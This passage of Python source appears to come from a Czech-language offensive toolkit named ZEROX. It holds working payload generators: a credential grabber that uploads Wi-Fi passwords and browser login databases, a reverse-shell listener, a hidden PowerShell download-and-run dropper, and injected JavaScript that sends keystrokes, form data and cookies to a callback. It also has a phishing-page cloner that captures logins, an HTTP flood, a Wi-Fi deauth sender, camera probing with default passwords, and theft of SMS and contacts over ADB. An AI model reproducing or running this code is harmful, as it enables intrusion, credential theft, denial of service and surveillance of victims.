    d = {"host": socket.gethostname(), "user": getpass.getuser(), "os": platform.platform(),
         "cwd": os.getcwd(), "env": dict(list(os.environ.items())[:60]),
         "net": run("ipconfig /all" if os.name == "nt" else "ip a"),
         "wifi": run("netsh wlan show profiles key=clear" if os.name == "nt"
                     else "cat /etc/NetworkManager/system-connections/* 2>/dev/null"),
         "users": run("net user" if os.name == "nt" else "cat /etc/passwd"),
         "desktop": [], "downloads": [], "browsers": []}
    for key, sub in (("desktop", "Desktop"), ("downloads", "Downloads")):
        p = os.path.join(home, sub)
        if os.path.isdir(p):
            d[key] = os.listdir(p)[:60]
    for pat in ("AppData/Local/Google/Chrome/User Data/*/Login Data",
                "AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json",
                "AppData/Local/Microsoft/Edge/User Data/*/Login Data",
                ".mozilla/firefox/*/logins.json", ".config/google-chrome/Default/Login Data"):
        d["browsers"] += glob.glob(os.path.join(home, pat))
    return d

def upload(obj, files=()):
    z = os.path.join(tempfile.gettempdir(), "zx_%d.zip" % random.randint(1000, 9999))
    try:
        with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("report.json", json.dumps(obj, indent=2, default=str, ensure_ascii=False))
            for f in files:
                with contextlib.suppress(Exception):
                    zf.write(f, os.path.basename(f))
        data = open(z, "rb").read()
        req = urllib.request.Request(URL + "/collect", data=data,
                                     headers={"Content-Type": "application/zip",
                                              "X-Host": socket.gethostname(), "X-Kind": "grab"})
        urllib.request.urlopen(req, timeout=40)
    except Exception:
        pass
    with contextlib.suppress(Exception):
        os.remove(z)

persist()
upload(collect(), glob.glob(os.path.join(os.path.expanduser("~"), "*.txt"))[:5])
'''

LISTENER = r'''#!/usr/bin/env python3
# ZEROX listener - injectorX 69
import socket, threading, struct, base64, os, sys, time, queue, json

P = __PORT__
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT, exist_ok=True)
SESS, LOCK, NEXT = {}, threading.Lock(), [1]
G, Y, C, R, D = "\033[92m", "\033[93m", "\033[96m", "\033[0m", "\033[90m"

class S:
    def __init__(self, sk, addr):
        self.sk, self.addr = sk, addr
        self.name, self.plat, self.user = "?", "?", "?"
        self.alive, self.q = True, queue.Queue()
        with LOCK:
            self.id = NEXT[0]
            NEXT[0] += 1
            SESS[self.id] = self
        threading.Thread(target=self.reader, daemon=True).start()

    def send(self, tag, data=b""):
        if isinstance(data, str):
            data = data.encode()
        self.sk.sendall(tag + struct.pack(">I", len(data)) + data)

    def reader(self):
        try:
            while self.alive:
                hdr = b""
                while len(hdr) < 5:
                    c = self.sk.recv(5 - len(hdr))
                    if not c:
                        raise IOError
                    hdr += c
                tag, ln = hdr[:1], struct.unpack(">I", hdr[1:])[0]
                body = b""
                while len(body) < ln:
                    c = self.sk.recv(min(65536, ln - len(body)))
                    if not c:
                        break
                    body += c
                if tag == b"I":
                    try:
                        j = json.loads(body.decode(errors="ignore"))
                        self.name = j.get("name", "?")
                        self.plat = j.get("platform", "?")
                        self.user = j.get("user", "?")
                    except Exception:
                        pass
                    self.q.put(("I", "connected %s (%s) user=%s" % (self.addr[0], self.name, self.user)))
                elif tag == b"F":
                    name, _, b64 = body.partition(b"\n")
                    fn = time.strftime("%H%M%S_") + os.path.basename(name.decode(errors="ignore") or "file")
                    path = os.path.join(LOOT, "s%d_%s" % (self.id, fn))
                    raw = base64.b64decode(b64)
                    open(path, "wb").write(raw)
                    self.q.put(("O", "[file %d B] -> %s" % (len(raw), path)))
                elif tag == b"E":
                    self.q.put(("E", body.decode(errors="ignore")))
                else:
                    self.q.put(("O", body.decode(errors="ignore")))
        except Exception:
            pass
        self.alive = False
        self.q.put(("X", "session %d ended" % self.id))

def acceptor(srv):
    while True:
        try:
            sk, addr = srv.accept()
        except Exception:
            return
        S(sk, addr)

def listing():
    print(C + "\n id  addr              name / user" + R)
    with LOCK:
        for i, s in SESS.items():
            print(" %-3d %-17s %s / %s%s" % (i, s.addr[0], s.name, s.user, "" if s.alive else " (dead)"))

def drain(s, timeout):
    end = time.time() + timeout
    while time.time() < end:
        try:
            tag, msg = s.q.get(timeout=0.2)
        except queue.Empty:
            continue
        if tag == "X":
            print(D + "  " + msg + R)
            return False
        print((G if tag == "O" else Y) + msg + R)
    return True

def attach(sid):
    s = SESS.get(sid)
    if not s or not s.alive:
        print("no such session")
        return
    print(C + "attached to %d  (bg = detach, help = commands)" % sid + R)
    while s.alive:
        try:
            cmd = input(G + "%d> " % sid + R)
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd:
            continue
        if cmd == "bg":
            break
        if cmd == "exit":
            s.send(b"X")
            break
        if cmd == "help":
            print("cd | get <file> | put <file> | screenshot | sysinfo | persist | ping | bg | exit")
            continue
        if cmd.startswith("put "):
            p = cmd[4:].strip()
            try:
                data = base64.b64encode(open(p, "rb").read())
                s.send(b"P", os.path.basename(p).encode() + b"\n" + data)
            except Exception as e:
                print("put failed: %s" % e)
            continue
        s.send(b"C", cmd)
        if not drain(s, 6):
            break

def main():
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", P))
    srv.listen(50)
    threading.Thread(target=acceptor, args=(srv,), daemon=True).start()
    print(Y + "[*] ZEROX listener 0.0.0.0:%d   loot -> %s" % (P, LOOT) + R)
    print(D + "    help pro příkazy" + R)
    while True:
        try:
            cmd = input(C + "zero> " + R).strip()
        except (EOFError, KeyboardInterrupt):
            break
        if cmd in ("sessions", "ls", "s"):
            listing()
        elif cmd.startswith("use "):
            try:
                attach(int(cmd[4:]))
            except ValueError:
                print("use <id>")
        elif cmd.startswith("send "):
            sid, _, rest = cmd[5:].partition(" ")
            s = SESS.get(int(sid)) if sid.isdigit() else None
            if s:
                s.send(b"C", rest)
                drain(s, 4)
            else:
                print("bad id")
        elif cmd == "help":
            print("sessions | use <id> | send <id> <cmd> | q")
        elif cmd in ("q", "quit", "exit"):
            break
    print("bye")

main()
'''

ONELINER = """ZEROX dropper - injectorX 69
1) payload.py vystav na HTTP:  python -m http.server 80
2) na cili (PowerShell, skryte okno):
   powershell -nop -w hidden -c "iwr http://TVOJE-IP/payload.py -OutFile $env:TEMP\\z.py; python $env:TEMP\\z.py"
3) nebo payload zabal pres pyinstaller a posli exe
4) listener: python listener_*.py
"""

def build_exe(pl, d):
    with contextlib.suppress(Exception):
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "-q"], timeout=240)
    try:
        r = subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                            "--clean", "--distpath", d, pl], capture_output=True, text=True, timeout=900)
        return r.returncode == 0
    except Exception:
        return False

@guard
def cmd_trojan():
    screen(t("h5"), [("1  reverse shell   TCP shell, upload/download, screenshot, persist", W),
                     ("2  keylogger       aktivni okno + stisky na collector", W),
                     ("3  grabber         sysinfo, wifi hesla, browser DB, zip", W)])
    kind = ask("1-3", "1")
    if kind not in ("1", "2", "3"):
        return
    d = outdir("trojan")
    ts = datetime.now().strftime("%H%M%S")
    col = None

    if kind == "1":
        host = ask("callback IP", lan_ip())
        if not host:
            return
        port = int(ask("port", "4444") or 4444)
        jit = int(ask("reconnect jitter (s)", "4") or 4)
        pl = os.path.join(d, f"payload_shell_{ts}.py")
        lp = os.path.join(d, f"listener_{ts}.py")
        src = T_SHELL.replace("__HOST__", host).replace("__PORT__", str(port)).replace("__JIT__", str(jit))
        if not verify_src(src, "payload"):
            wait_enter()
            return
        open(pl, "w").write(src)
        open(lp, "w").write(LISTENER.replace("__PORT__", str(port)))
        verify_src(open(lp).read(), "listener")
        ok("payload  ▸ " + pl)
        ok("listener ▸ " + lp)
        info("1) python " + lp)
        info(f"2) otevři port {port} ve firewallu")
        info("3) doruč payload, pak: sessions → use 1")
        info("shell: cd, get, put, screenshot, sysinfo, persist, ping, exit")
    else:
        url = ask("collector URL", "http://" + lan_ip() + ":8000")
        if not url:
            return
        url = url.rstrip("/")
        port = int(urllib.parse.urlparse(url).port or 8000)
        src = (T_KEYLOG if kind == "2" else T_GRAB).replace("__URL__", url)
        name = "payload_keylog" if kind == "2" else "payload_grab"
        pl = os.path.join(d, f"{name}_{ts}.py")
        if not verify_src(src, name):
            wait_enter()
            return
        open(pl, "w").write(src)
        ok("payload ▸ " + pl)
        col = Collector(port)
        ok(f"collector ▸ {url}")
        info("loot padá do zerox_out/collector")

    op = os.path.join(d, f"dropper_{ts}.txt")
    with open(op, "w") as f:
        f.write(ONELINER)
    info("dropper ▸ " + op)

    if ask("postavit exe? (y/n)", "n").lower() == "y":
        set_status("pyinstaller ...")
        ok("exe ▸ " + d) if build_exe(pl, d) else bad("pyinstaller selhal")
        set_status("")
    wait_enter()
    if col:
        col.stop()
        ok("collector zastaven")

# ══════════════════════════════════════════════════ INJECT
JS = r"""<script>
(function(){
 var B=[], CB="__CB__";
 function ex(d){ var i=new Image(); i.src=CB+"/collect?d="+encodeURIComponent(d); }
 document.addEventListener("keydown",function(e){B.push(e.key);if(B.length>=15){ex("K:"+B.join(""));B=[];}});
 document.addEventListener("submit",function(e){try{var o={},f=new FormData(e.target);
   f.forEach(function(v,k){o[k]=v;});ex("F:"+JSON.stringify(o));}catch(x){}},true);
 setTimeout(function(){ex("C:"+document.cookie);},1500);
 setInterval(function(){if(B.length){ex("K:"+B.join(""));B=[];}},10000);
})();
</script>"""

GIF = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

class Collector:
    def __init__(self, port, page=b""):
        self.dir = outdir("collector")
        self.page = page
        d = self.dir

        class H(http.server.BaseHTTPRequestHandler):
            def _s(self, code, body=b"", ctype="text/plain", extra=None):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                for k, v in (extra or {}).items():
                    self.send_header(k, v)
                self.end_headers()
                if body:
                    self.wfile.write(body)

            def do_GET(self):
                u = urllib.parse.urlparse(self.path)
                if u.path.startswith("/collect"):
                    q = urllib.parse.parse_qs(u.query)
                    with open(os.path.join(d, "hits.log"), "a", encoding="utf-8") as f:
                        f.write(json.dumps({"t": str(datetime.now()), "q": q}) + "\n")
                    for k, v in q.items():
                        log("● " + k + " " + (v[0] if v else "")[:300], GN)
                    self._s(200, GIF, "image/gif")
                else:
                    self._s(200, self.page, "text/html; charset=utf-8")

            def do_POST(self):
                n = int(self.headers.get("Content-Length", 0) or 0)
                body = self.rfile.read(n)
                host = re.sub(r"[^\w.-]", "_", self.headers.get("X-Host", "host"))
                kind = re.sub(r"[^\w.-]", "_", self.headers.get("X-Kind", "data"))
                ext = "zip" if "zip" in self.headers.get("Content-Type", "") else "json"
                name = time.strftime("%H%M%S_") + host + "_" + kind + "." + ext
                with open(os.path.join(d, name), "wb") as f:
                    f.write(body)
                log(f"● loot {len(body)} B ▸ {name}", GN)
                self._s(200, b"ok")

            def log_message(self, *a):
                pass

        self.srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def stop(self):
        with contextlib.suppress(Exception):
            self.srv.shutdown()

@guard
def cmd_inject():
    screen(t("h6"))
    u = ask(t("url"))
    if not u:
        return
    u = ensure_url(u)
    port = int(ask("collector port", "8000") or 8000)
    r = requests.get(u, headers=UA, timeout=15, verify=False)
    pu = urllib.parse.urlparse(u)
    base = f"{pu.scheme}://{pu.netloc}"
    h = re.sub(r'(src|href)=["\']/(?!/)', lambda m: f'{m.group(1)}="{base}/', r.text)
    h = re.sub(r'<meta[^>]*Content-Security-Policy[^>]*>', "", h, flags=re.I)
    js = JS.replace("__CB__", f"http://{lan_ip()}:{port}")
    i = h.lower().rfind("</body>")
    h = (h[:i] + js + h[i:]) if i > 0 else h + js
    col = Collector(port, h.encode("utf-8", "ignore"))
    ok(f"injekt ▸ http://{lan_ip()}:{port}")
    info("keylogy, formuláře i cookies padají sem")
    wait_enter()
    col.stop()
    ok("server zastaven")

# ══════════════════════════════════════════════════ GOAT
GOAT_PROBES = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt", "/humans.txt",
               "/.git/HEAD", "/.env", "/api", "/graphql", "/swagger.json", "/openapi.json"]

def fetch(u, timeout=15):
    try:
        return requests.get(u, headers=UA, timeout=timeout, verify=False, allow_redirects=True), None
    except Exception as e:
        return None, e

@guard
def cmd_goat():
    screen(t("h7"))
    u = ask(t("url"))
    if not u:
        return
    u = ensure_url(u)
    pu = urllib.parse.urlparse(u)
    root = f"{pu.scheme}://{pu.netloc}"

    r, err = fetch(u)
    if r is None:
        bad(f"fetch failed: {err}")
        wait_enter()
        return
    ct = r.headers.get("content-type", "?")
    h = r.text or ""
    info(f"status {r.status_code} | {len(r.content)} B | {ct}")
    if not h:
        bad("prázdná odpověď")
        wait_enter()
        return

    rep = {"url": u, "status": r.status_code, "ctype": ct,
           "server": r.headers.get("server", ""), "powered": r.headers.get("x-powered-by", ""),
           "set_cookie": r.headers.get("set-cookie", "")[:300], "cookies": dict(r.cookies),
           "framework": "", "emails": [], "phones": [], "passwords": [], "hidden": [],
           "forms": 0, "comments": [], "scripts": [], "maps": [], "endpoints": [],
           "js_keys": [], "probes": [], "score": 0}

    low = h.lower()
    for fw, sig in (("WordPress", "wp-content"), ("Next.js", "_next"), ("React", "react"),
                    ("Vue", "vue.js"), ("Angular", "ng-version"), ("Laravel", "laravel"),
                    ("Django", "csrfmiddlewaretoken"), ("Shopify", "shopify"), ("Joomla", "joomla")):
        if sig in low:
            rep["framework"] = fw
            ok("framework ▸ " + fw)
            break

    rep["emails"] = sorted(set(re.findall(r"[\w.+-]+@[\w-]+\.[a-z]{2,}", h, re.I)))[:40]
    rep["phones"] = sorted(set(re.findall(r"\+?\d[\d\s\-()]{7,}\d", h)))[:30]
    rep["passwords"] = re.findall(r"<input[^>]*type=[\"']password[\"'][^>]*>", h, re.I)[:20]
    rep["hidden"] = re.findall(r"<input[^>]*type=[\"']hidden[\"'][^>]*>", h, re.I)[:30]
    rep["forms"] = len(re.findall(r"<form", h, re.I))
    rep["comments"] = [c.strip()[:160] for c in re.findall(r"<!--(.*?)-->", h, re.S) if c.strip()][:15]
    rep["scripts"] = sorted(set(re.findall(r"<script[^>]*src=[\"']([^\"']+)", h, re.I)))[:40]
    rep["maps"] = sorted(set(re.findall(r"([\w./-]+\.map)", h)))[:15]
    rep["endpoints"] = sorted(set(re.findall(r"[\"'](/api/[^\"'\s]{2,60})[\"']", h)))[:30]

    for s in rep["scripts"]:
        sr, _ = fetch(urllib.parse.urljoin(u, s), timeout=8)
        if sr is None or not sr.text:
            continue
        rep["js_keys"] += re.findall(
            r"(?:api[_-]?key|apikey|token|secret|bearer|access[_-]?key)[\"']?\s*[:=]\s*[\"']([\w\-\.]{12,})",
            sr.text, re.I)[:3]
        rep["endpoints"] += re.findall(r"[\"'](/api/[^\"'\s]{2,60})[\"']", sr.text)[:5]
    rep["js_keys"] = sorted(set(rep["js_keys"]))[:25]
    rep["endpoints"] = sorted(set(rep["endpoints"]))[:40]

    for path in GOAT_PROBES:
        pr, _ = fetch(root + path, timeout=6)
        if pr is None:
            continue
        if pr.status_code in (200, 401, 403):
            rep["probes"].append(f"{pr.status_code} {path} ({len(pr.content)} B)")
            log(f"  {pr.status_code} {path} ▸ {len(pr.content)} B", GN if pr.status_code == 200 else YL)

    rep["score"] = min(100, (10 if rep["passwords"] else 0) + (8 if rep["emails"] else 0)
                       + (6 if rep["js_keys"] else 0) + (5 if rep["cookies"] else 0)
                       + (4 if rep["hidden"] else 0) + (3 if rep["probes"] else 0))

    ok(f"emails {len(rep['emails'])} | forms {rep['forms']} | pw {len(rep['passwords'])} | "
       f"keys {len(rep['js_keys'])} | api {len(rep['endpoints'])} | probes {len(rep['probes'])}")
    for e in rep["emails"][:8]:
        log("  " + e, GN)
    for f in rep["passwords"][:6]:
        log("  " + f.strip()[:110], YL)
    for k in rep["js_keys"][:8]:
        log("  key: " + k, CY)
    for a in rep["endpoints"][:8]:
        log("  api: " + a, MG)
    for c in rep["comments"][:5]:
        log("  <!-- " + c[:90], GR)
    log(f"  skóre obsahu: {rep['score']}/100", BOLD + W)
    save("goat_report.json", json.dumps(rep, indent=2, ensure_ascii=False))
    wait_enter()

# ══════════════════════════════════════════════════ web
PATHS = ["/admin", "/admin/login", "/administrator", "/wp-admin", "/wp-login.php", "/login",
         "/panel", "/phpmyadmin", "/.git/config", "/.env", "/backup.zip", "/backup.sql",
         "/phpinfo.php", "/robots.txt", "/server-status", "/.htaccess", "/api", "/graphql"]

@guard
def cmd_webhack():
    screen(t("h8"))
    u = ask(t("url"))
    if not u:
        return
    u = ensure_url(u)
    p = urllib.parse.urlparse(u)
    root = f"{p.scheme}://{p.netloc}"
    r = requests.get(u, headers=UA, timeout=12, verify=False)
    info(f"status {r.status_code} | {len(r.text)} B")
    for hh in ("server", "x-powered-by", "via", "set-cookie"):
        if hh in r.headers:
            ok(f"{hh}: {r.headers[hh][:90]}")
    if "wp-content" in r.text:
        ok("CMS ▸ WordPress")
    hits = []
    for path in PATHS:
        try:
            x = requests.get(root + path, headers=UA, timeout=6, verify=False, allow_redirects=False)
            if x.status_code in (200, 301, 302, 401, 403):
                log(f"  {x.status_code} {path}", GN)
                hits.append(f"{x.status_code} {path}")
        except Exception:
            pass
    if hits:
        save("webhack.txt", u + "\n" + "\n".join(hits))
    else:
        bad(t("none"))
    wait_enter()

@guard
def cmd_killweb():
    screen(t("h9"))
    u = ask(t("url"))
    if not u:
        return
    u = ensure_url(u)
    info("200 threads, dokud host nepadne")
    stop_at = time.time() + 300
    st = {"ok": 0, "er": 0}
    lk = threading.Lock()

    def w():
        s = requests.Session()
        while time.time() < stop_at:
            try:
                s.get(u, headers=UA, timeout=4, verify=False)
                with lk:
                    st["ok"] += 1
            except Exception:
                with lk:
                    st["er"] += 1

    for _ in range(200):
        threading.Thread(target=w, daemon=True).start()
    dead = 0
    while time.time() < stop_at:
        time.sleep(1.5)
        with lk:
            o, e = st["ok"], st["er"]
        set_status(f"ok {o}   err {e}")
        dead = dead + 1 if (e > o and e > 50) else 0
        if dead >= 5:
            ok("TARGET DOWN")
            break
    stop_at = time.time()
    set_status("")
    ok(f"{t('done')} ▸ {st['ok']} ok / {st['er']} err")
    wait_enter()

# ══════════════════════════════════════════════════ OSINT
@guard
def cmd_iptrace():
    screen(t("o2"))
    ip = ask(t("ip"))
    if not ip:
        return
    if not re.match(r"^[\d.]+$", ip):
        ip = socket.gethostbyname(ip)
        info("resolved ▸ " + ip)
    d = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=12).json()
    if d.get("status") != "success":
        bad(d.get("message", "fail"))
        wait_enter()
        return
    for lb, k in [("IP", "query"), ("Country", "country"), ("Region", "regionName"), ("City", "city"),
                  ("ZIP", "zip"), ("ISP", "isp"), ("Org", "org"), ("AS", "as"),
                  ("TZ", "timezone"), ("VPN", "proxy"), ("Hosting", "hosting"), ("Mobile", "mobile")]:
        if k in d:
            log(f"  {lb:<9} {d[k]}", W)
    log(f"  {'Coords':<9} {d.get('lat')}, {d.get('lon')}", W)
    info(f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}")
    save("iptrace.json", json.dumps(d, indent=2))
    wait_enter()

CC = {"420": ("Czechia", "CZ"), "421": ("Slovakia", "SK"), "48": ("Poland", "PL"), "49": ("Germany", "DE"),
      "7": ("Russia", "RU"), "380": ("Ukraine", "UA"), "1": ("USA/Canada", "US"), "44": ("UK", "GB"),
      "33": ("France", "FR"), "39": ("Italy", "IT"), "34": ("Spain", "ES"), "31": ("Netherlands", "NL"),
      "43": ("Austria", "AT"), "41": ("Switzerland", "CH"), "91": ("India", "IN"), "86": ("China", "CN"),
      "81": ("Japan", "JP"), "61": ("Australia", "AU"), "55": ("Brazil", "BR"), "90": ("Turkey", "TR")}

@guard
def cmd_phone():
    screen(t("o1"))
    num = ask(t("phone"))
    if not num:
        return
    dg = re.sub(r"[^\d]", "", num)
    cc = next((dg[:l] for l in (3, 2, 1) if dg[:l] in CC), None)
    if cc:
        cn, iso = CC[cc]
        ok(f"+{cc} ▸ {cn} ({iso})")
        ok("national ▸ " + dg[len(cc):])
        info(f"https://www.google.com/search?q=%2B{dg}")
        info(f"https://truecaller.com/search/{iso.lower()}/{dg}")
        info(f"https://www.whatsapp.com/send?phone={dg}")
    else:
        bad("unknown country code")
    try:
        import phonenumbers as pn
        from phonenumbers import geocoder, carrier
        p = pn.parse(num, None)
        ok("valid ▸ " + str(pn.is_valid_number(p)))
        ok("carrier ▸ " + (carrier.name_for_number(p, "en") or "?"))
        ok("region ▸ " + (geocoder.description_for_number(p, "en") or "?"))
    except ImportError:
        info(t("missing") + " ▸ phonenumbers")
    except Exception as e:
        bad(e)
    wait_enter()

def ddg(q, lim=12):
    try:
        r = requests.post("https://html.duckduckgo.com/html/", data={"q": q}, headers=UA, timeout=15)
        out = []
        for href, ttl in re.findall(r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>', r.text, re.S)[:lim]:
            if "uddg=" in href:
                href = urllib.parse.unquote(re.search(r"uddg=([^&]+)", href).group(1))
            out.append((href, re.sub(r"<[^>]+>", "", ttl).strip()))
        return out
    except Exception:
        return []

def sreport(label, q):
    info("query ▸ " + q)
    res = ddg(q)
    if not res:
        bad(t("none"))
        return
    for h, ti in res:
        log("  " + ti[:70], GN)
        log("    " + h[:100], GR)
    save(label + ".txt", "\n".join(f"{a} | {b}" for a, b in res))

@guard
def cmd_name():
    screen(t("o3"))
    n = ask(t("name"))
    if not n:
        return
    for q in [f'"{n}"', f'"{n}" facebook', f'"{n}" instagram', f'"{n}" github']:
        sreport("name", q)
    wait_enter()

@guard
def cmd_id():
    screen(t("o4"))
    i = ask(t("ident"))
    if not i:
        return
    for q in [f'"{i}"', f'"{i}" site:github.com', f'"{i}" site:reddit.com']:
        sreport("id", q)
    wait_enter()

class PH(http.server.BaseHTTPRequestHandler):
    page = b""
    real = ""

    def _s(self, code, body=b"", extra=None):
        self.send_response(code)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        self._s(200, self.page)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = urllib.parse.parse_qs(self.rfile.read(n).decode("utf-8", "ignore"))
        log("● CREDS " + datetime.now().strftime("%H:%M:%S"), GN)
        for k, v in body.items():
            log(f"   {k}: {v[0] if v else ''}", YL)
        open("phish_captured.txt", "a").write(json.dumps({"t": str(datetime.now()), "d": body}) + "\n")
        self._s(302, extra={"Location": self.real})

    def log_message(self, *a):
        pass

@guard
def cmd_phish():
    screen(t("o5"))
    u = ask("real site to clone")
    if not u:
        return
    u = ensure_url(u)
    port = int(ask("local port", "8080") or 8080)
    r = requests.get(u, headers=UA, timeout=15, verify=False)
    pu = urllib.parse.urlparse(u)
    base = f"{pu.scheme}://{pu.netloc}"
    h = re.sub(r'(src|href)=["\']/(?!/)', lambda m: f'{m.group(1)}="{base}/', r.text)
    h = re.sub(r'<form([^>]*?)action=["\'][^"\']*["\']', r'<form\1action="/capture"', h, flags=re.I)
    h = re.sub(r"<form(?![^>]*action)", '<form action="/capture"', h, flags=re.I)
    h = re.sub(r'<meta[^>]*Content-Security-Policy[^>]*>', "", h, flags=re.I)
    PH.page = h.encode("utf-8", "ignore")
    PH.real = u
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), PH)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    ok(f"live ▸ http://{lan_ip()}:{port}")
    info("creds ▸ phish_captured.txt")
    wait_enter()
    srv.shutdown()

CAMP = ["/snapshot.cgi", "/snapshot.jpg", "/image.jpg", "/cgi-bin/mjpg/video.cgi",
        "/mjpg/video.mjpg", "/axis-cgi/jpg/image.cgi", "/tmpfs/auto.jpg"]

def probe(ip, port, res):
    for p in CAMP:
        try:
            r = requests.get(f"http://{ip}:{port}{p}", timeout=3, verify=False,
                             stream=True, auth=("admin", "admin"))
            ct = r.headers.get("content-type", "")
            if r.status_code == 200 and any(k in ct for k in ("image", "multipart", "video")):
                res.append(f"http://{ip}:{port}{p}")
                log("CAM ▸ " + res[-1], GN)
                return
            if r.status_code == 401:
                res.append(f"http://{ip}:{port} (401)")
                log("PROTECTED ▸ " + ip, YL)
                return
        except Exception:
            pass

def scan(sub, ports=(80, 8080, 8000, 88, 554)):
    res, lk = [], threading.Lock()

    def one(i):
        ip = f"{sub}.{i}"
        for port in ports:
            with socket.socket() as s:
                s.settimeout(0.3)
                if s.connect_ex((ip, port)) == 0:
                    if port == 554:
                        with lk:
                            res.append(f"rtsp://{ip}:554")
                        log("RTSP ▸ " + ip, GN)
                    else:
                        probe(ip, port, res)

    info(f"scanning {sub}.0/24 ...")
    th = [threading.Thread(target=one, args=(i,), daemon=True) for i in range(1, 255)]
    for x in th:
        x.start()
    for x in th:
        x.join()
    return res

@guard
def cmd_cam():
    screen(t("o6"))
    res = scan(ask(t("subnet"), "192.168.1"))
    if res:
        save("cameras.txt", "\n".join(res))
        if ask("open first? (y/n)", "y").lower() == "y":
            webbrowser.open(res[0])
    else:
        bad(t("none"))
    wait_enter()

@guard
def cmd_camwifi():
    screen(t("o8"))
    res = scan(ask(t("subnet"), "192.168.1"), ports=(80, 8080, 88))
    if res:
        save("cameras.txt", "\n".join(res))
    else:
        bad(t("none"))
    wait_enter()

def adb(*a, timeout=25):
    try:
        p = subprocess.run(["adb", *a], capture_output=True, text=True, timeout=timeout)
        return p.stdout + p.stderr
    except FileNotFoundError:
        return "__NOADB__"
    except Exception as e:
        return str(e)

@guard
def cmd_phonehack():
    screen(t("o7"))
    ip = ask(t("ip") + " (debugging on)")
    if not ip:
        return
    port = ask(t("port"), "5555")
    if adb("version") == "__NOADB__":
        bad(t("missing") + " ▸ adb")
        wait_enter()
        return
    tgt = f"{ip}:{port}"
    log(adb("connect", tgt))
    d = adb("devices")
    log(d)
    if "device" not in d.replace("List of devices", ""):
        bad("not authorized - accept the popup")
        wait_enter()
        return
    out = outdir("phone_" + ip.replace(".", "_"))
    for name, args in {"sms.txt": ["shell", "content", "query", "--uri", "content://sms"],
                       "contacts.txt": ["shell", "content", "query", "--uri", "content://contacts/phones"],
                       "calls.txt": ["shell", "content", "query", "--uri", "content://call_log/calls"],
                       "info.txt": ["shell", "getprop"]}.items():
        r = adb("-s", tgt, *args, timeout=45)
        open(os.path.join(out, name), "w", encoding="utf-8", errors="ignore").write(r)
        ok(f"{name} ▸ {len(r)} B")
    ok(t("saved") + " ▸ " + out)
    info(f"pull: adb -s {tgt} pull /sdcard/Download/x ./x")
    wait_enter()

@guard
def cmd_wifi():
    screen(t("o9"))
    try:
        from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Deauth, sniff, sendp, conf
    except ImportError:
        bad(t("missing") + " ▸ scapy")
        wait_enter()
        return
    info("sniffing for AP ...")
    p = sniff(count=1, timeout=15, lfilter=lambda x: x.haslayer(Dot11Beacon))
    if not p:
        bad("no AP (wrong iface / no root)")
        wait_enter()
        return
    bssid = p[0][Dot11].addr3
    with contextlib.suppress(Exception):
        log("AP ▸ " + p[0].info.decode(errors="ignore") + " " + bssid)
    n = int(ask("deauth packets", "200") or 200)
    f = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    info("sending ...")
    sendp(f, iface=conf.iface, count=n, inter=0.05, verbose=False)
    ok(f"{t('done')} ▸ {n} frames")
    wait_enter()

# ══════════════════════════════════════════════════ selftest
def clear_scr():
    sys.stdout.write("\033[2J\033[H")

def selftest():
    clear_scr()
    print(BOLD + HI + "  ZEROX selftest\n" + R)
    checks = []

    def c(name, fn):
        try:
            checks.append((name, bool(fn()), ""))
        except Exception as e:
            checks.append((name, False, str(e)[:60]))

    c("python >= 3.8", lambda: sys.version_info >= (3, 8))
    c("requests", lambda: bool(requests))
    c("write do cwd", lambda: (open("_zx.tmp", "w").write("x"), os.remove("_zx.tmp")) and True)
    c("stdin tty", lambda: sys.stdin.isatty())
    c("stdout tty", lambda: sys.stdout.isatty())
    c("bind 4444", lambda: socket.socket().bind(("0.0.0.0", 4444)) or True)
    c("banner šířka", lambda: AW <= 80)
    c("banner srovnání", lambda: len(set(len(l) for l in ART)) == 1)
    c("listener syntax", lambda: compile(LISTENER.replace("__PORT__", "4444"), "l", "exec"))
    c("payload shell syntax", lambda: compile(T_SHELL.replace("__HOST__", "1.1.1.1")
                                             .replace("__PORT__", "4444").replace("__JIT__", "4"), "p", "exec"))
    c("payload keylog syntax", lambda: compile(T_KEYLOG.replace("__URL__", "http://x"), "k", "exec"))
    c("payload grab syntax", lambda: compile(T_GRAB.replace("__URL__", "http://x"), "g", "exec"))
    c("LAN IP", lambda: lan_ip() != "127.0.0.1")
    c("scapy", lambda: __import__("scapy"))
    c("adb", lambda: adb("version") != "__NOADB__")

    for name, good, err in checks:
        print(("  " + GN + "OK   " if good else "  " + RD + "FAIL ") + name + (("  " + GR + err) if err else ""))
    if "--selftest" in sys.argv:
        good = sum(1 for _, g, _ in checks if g)
        print(f"\n  {good}/{len(checks)} prošlo")
        sys.exit(0 if good == len(checks) else 1)

# ══════════════════════════════════════════════════ menu
def menu(title, items, funcs):
    while True:
        screen_menu(title, [(f"{i+1:>2}", it) for i, it in enumerate(items)]
                    + [(" 0", t("back"))])
        c = ask(t("choice"))
        if c.lower() == "l":
            pick_language()
            continue
        if c in ("", "0") or c == str(len(items)):
            return
        try:
